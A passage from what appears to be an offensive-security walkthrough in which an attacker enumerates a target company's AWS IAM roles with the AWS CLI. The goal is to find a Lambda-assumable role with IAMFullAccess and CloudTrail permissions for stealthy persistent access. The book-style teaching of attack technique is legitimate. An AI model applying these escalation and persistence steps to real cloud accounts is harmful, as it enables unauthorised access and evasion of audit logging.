    \ heavy IAM and CloudTrail permissions to help us maintain stealthy long-term\
    \ access (more on that later).\n\nWe look for promising candidates we can impersonate\
    \ with the Lambda AWS service. Remember that in order to impersonate a role, two\
    \ conditions must be met: the user must be able to issue sts assume-role calls\
    \ and the role must accept impersonation from said user. We list the roles available\
    \ within MXR Ads’ AWS account:\n\n```\n```\nroot@Point1:~/# aws iam list-roles\
    \ \\\n| jq -r '.Roles[] | .RoleName + \", \" + \\\n.AssumeRolePolicyDocument.Statement[].Principal.Service'\
    \ \\\n| grep \"lambda.amazonaws.com\"\n\ndynamo-access-mgmt, lambda.amazonaws.com\n\
    chef-cleanup-ro, lambda.amazonaws.com\n--snip--\n```\n```\n\nWe check each role’s\
    \ IAM policy until we find a role with the set of permissions we need—ideally,\
    \ full IAM and CloudTrail access:\n\n```\n```\nroot@Point1:~/# aws iam list-attached-role-policies\
    \ --role dynamo-ssh-mgmt --profile jenkins\n\n\"AttachedPolicies\": [\n    \"\
    PolicyName\": \"IAMFullAccess\",\n    \"PolicyName\": \"cloudtrail-mgmt-rw\",\n\
    \    \"PolicyName\": \"dynamo-temp-rw\",\n--snip--\n```\n```\n\nThe dynamo-ssh-mgmt\
    \ role might do the trick, as it has an IAMFullAccess policy. Cheeky. If we had\
    \ been creating our own role from scratch in MXR Ads’ AWS account, we would not\
    \ have dared to attach such an obvious policy. However, since they’re already\
